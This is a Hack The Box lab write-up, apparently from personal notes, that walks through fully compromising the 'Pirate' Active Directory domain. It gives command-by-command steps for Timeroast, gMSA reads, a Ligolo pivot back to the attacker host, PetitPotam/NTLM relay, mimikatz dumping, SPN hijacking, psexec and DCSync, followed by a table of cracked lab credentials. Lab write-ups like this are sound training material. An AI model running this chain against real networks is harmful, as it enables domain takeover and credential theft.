---
title: Pirate
type: htb-writeup
source: Hack The Box
platform: Windows / Active Directory
difficulty: Hard
tags: [htb, writeup, windows, active-directory, kerberos, delegation, pivoting]
---

# Pirate

**Domain:** `pirate.htb` · **DC:** `DC01` (10.129.244.95) · **Internal subnet:** `192.168.100.0/24`

## Fast lookup

- Start with [Kerberos, certificates, and delegation](../../OSCP/06-Active-Directory/Techniques/Active-Directory/07-Kerberos-Certificates-and-Delegation.md).
- For internal subnet access, review [pivoting and lateral movement](../../OSCP/07-Pivoting/Techniques/Cross-Platform/08-Pivoting-and-Lateral-Movement.md).
- For account and machine-object permissions, review [AD identity and ACL abuse](../../OSCP/06-Active-Directory/Techniques/Active-Directory/06-AD-Identity-and-ACL-Abuse.md).

## Attack chain overview

```
pentest creds (given)
  → Timeroast → MS01$ TGT
  → gMSA read via MS01$ → gMSA_ADFS_prod$ NTLM hash
  → Evil-WinRM on DC01 as gMSA_ADFS_prod$
  → Ligolo pivot → 192.168.100.0/24 reachable
  → WEB01 (192.168.100.2) accessible
  → PetitPotam coerce WEB01 → ntlmrelayx → EFPJOHAY$ (delegate access on WEB01)
  → Kerberoast a.white_adm → crack → Password123!
  → a.white_adm has SPN WRITE on DC01
  → addspn.py: hijack HTTP/WEB01 SPNs to DC01
  → getST impersonate Administrator → cifs/DC01
  → psexec → SYSTEM on DC01
  → secretsdump → Administrator hash
```

> Clock skew is **+7 hours** — every Kerberos command is prefixed with `faketime 'now + 7 hours'`.

## 1. Enumeration

```bash
nmap -Pn -T5 -sV -p- -sC --open --reason -oN pirate.htb 10.129.244.95
```
Key ports: 53, 80, 88, 389/636, 445, 5985.

```bash
netexec ldap pirate.htb -u pentest -p 'p3nt3st2025!&' --users
# Administrator, a.white_adm, a.white, pentest, j.sparrow
netexec ldap pirate.htb -u pentest -p 'p3nt3st2025!&' --computers
# DC01$, WEB01$, MS01$, EXCH01$, gMSA_ADCS_prod$, gMSA_ADFS_prod$
netexec smb  pirate.htb -u pentest -p 'p3nt3st2025!&' --pass-pol   # no lockout → safe to spray
netexec smb  pirate.htb -u pentest -p 'p3nt3st2025!&' --shares     # READ: IPC$, NETLOGON, SYSVOL
netexec ldap dc01.pirate.htb -u pentest -p 'p3nt3st2025!&' --dns-server 10.129.244.95 --bloodhound -c All
```

Kerberoast:
```bash
faketime 'now + 7 hours' impacket-GetUserSPNs PIRATE.HTB/pentest:'p3nt3st2025!&' -dc-ip 10.129.244.95 -request
```
Returns `a.white_adm` (SPN `ADFS/a.white`, IT group, constrained delegation). Cracked hash → **`Password123!`**.

## 2. Timeroast → MS01$ TGT

```bash
nxc smb 10.129.69.85 -u pentest -p 'p3nt3st2025!&' -M timeroast
# TIMEROAST ... 1000:$sntp-ms$...  (machine-account NTP hashes)
hashcat -a 0 -m 31300 hashes /usr/share/wordlists/rockyou.txt
```
Cracks `MS01$` password: **`ms01`**.

```bash
# use it to get a TGT
faketime 'now + 7 hours' netexec smb pirate.htb -u 'ms01$' -p 'ms01' -k --generate-tgt ms01
export KRB5CCNAME=ms01.ccache
```

## 3. gMSA password retrieval

`MS01$` is in `Domain Secure Servers` → can read gMSA passwords.
```bash
faketime 'now + 7 hours' netexec ldap pirate.htb -u 'MS01$' -k --use-kcache --gmsa
# gMSA_ADCS_prod$  NTLM: 2b8849da91d5206b9d1d1dcb44467089
# gMSA_ADFS_prod$  NTLM: 76754c94319e3a7dc07ba09aa79028ee
```

## 4. WinRM on DC01

Both gMSA accounts are in Remote Management Users:
```bash
netexec winrm pirate.htb -u 'gMSA_ADFS_prod$' -H 76754c94319e3a7dc07ba09aa79028ee
faketime 'now + 7 hours' evil-winrm -i pirate.htb -u 'gMSA_ADFS_prod$' -H 76754c94319e3a7dc07ba09aa79028ee
```

## 5. Pivot to 192.168.100.0/24 via Ligolo-ng

DC01 is dual-homed (`10.129.244.95` external, `192.168.100.1` internal); WEB01 is at `192.168.100.2`.
```bash
# Kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# On DC01 (Evil-WinRM): upload agent.exe, then run
.\agent.exe -connect 10.10.15.46:11601 -ignore-cert

# In proxy console: session → select DC01 → start --tun ligolo
sudo ip route add 192.168.100.0/24 dev ligolo
nmap -Pn -sV -T5 -sC --top-ports 1000 192.168.100.2
```
WEB01 SMB signing: enabled but not required → relay possible.

## 6. WinRM on WEB01
```bash
evil-winrm -i 192.168.100.2 -u 'gMSA_ADFS_prod$' -H 76754c94319e3a7dc07ba09aa79028ee
```

## 7. NTLM relay: PetitPotam → delegate access on WEB01

WEB01 has no SMB signing → relay its auth to DC01 LDAP to get a machine account with delegation rights over WEB01.
```bash
# Terminal 1
sudo impacket-ntlmrelayx --no-http-server -smb2support -t ldap://10.129.244.95 --remove-mic --delegate-access
# Terminal 2 (coerce WEB01 through the ligolo tunnel)
netexec smb 192.168.100.2 -u 'gMSA_ADFS_prod$' -H 76754c94319e3a7dc07ba09aa79028ee \
  -M coerce_plus -o LISTENER=10.10.15.46 ALWAYS=true
```
Result: new computer `EFPJOHAY$ / lYKN!}G8_Pe{{po` can impersonate users on `WEB01$` via S4U2Proxy.

## 8. Impersonate Administrator on WEB01
```bash
faketime 'now + 7 hours' impacket-getST -spn 'cifs/WEB01.pirate.htb' -impersonate Administrator \
  -dc-ip 10.129.244.95 'pirate.htb/EFPJOHAY$:lYKN!}G8_Pe{{po'
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
faketime 'now + 7 hours' impacket-wmiexec -dc-ip 10.129.244.95 -k -no-pass WEB01.pirate.htb
# whoami: pirate\administrator
```

## 9. Dump a.white hash from WEB01

`a.white` is logged in interactively. Upload mimikatz via Evil-WinRM:
```powershell
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
# a.white NTLM: d2593a013aaf8e077ab0e69f9471b4c1
```
`user.txt` in `C:\Users\a.white\Desktop`.

## 10. Escalate to a.white_adm

`a.white` has `CanChangePassword` on `a.white_adm` (or just crack the Kerberoast hash from step 1 — same result).
```bash
faketime 'now + 7 hours' impacket-getTGT 'pirate.htb/a.white' -hashes :d2593a013aaf8e077ab0e69f9471b4c1 -dc-ip 10.129.244.95
export KRB5CCNAME=a.white.ccache
bloodyAD -k --host dc01.pirate.htb -d pirate.htb -u a.white --dc-ip 10.129.244.95 set password a.white_adm 'Password123!'
```

## 11. SPN hijack → compromise DC01

`a.white_adm` has SPN WRITE on DC01/WEB01 and constrained delegation to `HTTP/WEB01`. Hijack those SPNs onto DC01, then impersonate Administrator via S4U2Proxy.
```bash
faketime 'now + 7 hours' impacket-findDelegation 'pirate.htb/a.white_adm:Password123!' -dc-ip 10.129.244.95
# → constrained to HTTP/WEB01.pirate.htb, HTTP/WEB01

# Remove HTTP SPNs from WEB01
addspn.py -t 'WEB01$' -u 'pirate.htb\a.white_adm' -p 'Password123!' 'dc01.pirate.htb' -r --spn 'http/WEB01.pirate.htb'
addspn.py -t 'WEB01$' -u 'pirate.htb\a.white_adm' -p 'Password123!' 'dc01.pirate.htb' -r --spn 'http/WEB01'
# Add them to DC01
addspn -t 'DC01$' -u 'pirate.htb\a.white_adm' -p 'Password123!' -dc-ip 10.129.244.95 'dc01.pirate.htb' --spn 'http/WEB01.pirate.htb'
addspn -t 'DC01$' -u 'pirate.htb\a.white_adm' -p 'Password123!' -dc-ip 10.129.244.95 'dc01.pirate.htb' --spn 'http/WEB01'

# Impersonation ticket (-altservice rewrites the ticket SPN inline)
faketime 'now + 7 hours' impacket-getST -spn 'http/WEB01.pirate.htb' -altservice 'cifs/DC01.pirate.htb' \
  -impersonate Administrator -dc-ip 10.129.244.95 'pirate.htb/a.white_adm:Password123!'

export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
faketime 'now + 7 hours' impacket-psexec -k -no-pass DC01.pirate.htb
# whoami: nt authority\system
```
`root.txt` in `C:\Users\Administrator\Desktop`.

## 12. DCSync (post-exploitation)
```bash
faketime 'now + 7 hours' impacket-secretsdump -k -no-pass -just-dc-user Administrator -dc-ip 10.129.244.95 DC01.pirate.htb
# Administrator:500:...:598295e78bd72d66f837997baf715171:::
```

## Credentials summary

| Account | Secret | Type |
|---|---|---|
| pentest | p3nt3st2025!& | password |
| MS01$ | ms01 | pre-2k / timeroast |
| gMSA_ADCS_prod$ | 2b8849da91d5206b9d1d1dcb44467089 | NTLM |
| gMSA_ADFS_prod$ | 76754c94319e3a7dc07ba09aa79028ee | NTLM |
| EFPJOHAY$ | lYKN!}G8_Pe{{po | ntlmrelayx created |
| a.white | d2593a013aaf8e077ab0e69f9471b4c1 | NTLM (mimikatz) |
| a.white_adm | Password123! | kerberoast crack |
| Administrator | 598295e78bd72d66f837997baf715171 | NTLM (dcsync) |

## Lessons learned

- **`addspn.py` for SPN manipulation** — `bloodyAD set object` requires a full attribute replace (all existing SPNs listed); `addspn.py -r` does attribute-level add/remove, much cleaner.
- **Timeroast early** — cracking `ms01` directly is more reliable than guessing pre-2k passwords.
- **Evil-WinRM `upload` beats HTTP servers** for transfer when WinRM is available — no routing issues.
- **Ligolo > chisel+proxychains** — real tunnel interface with native routing, no `proxychains` prefix.
- **`-altservice` in getST** — avoids the separate `tgssub.py` step when rewriting the ticket SPN after S4U2Proxy.

---
*Migrated from local Obsidian lab notes. Review evidence before reuse.*
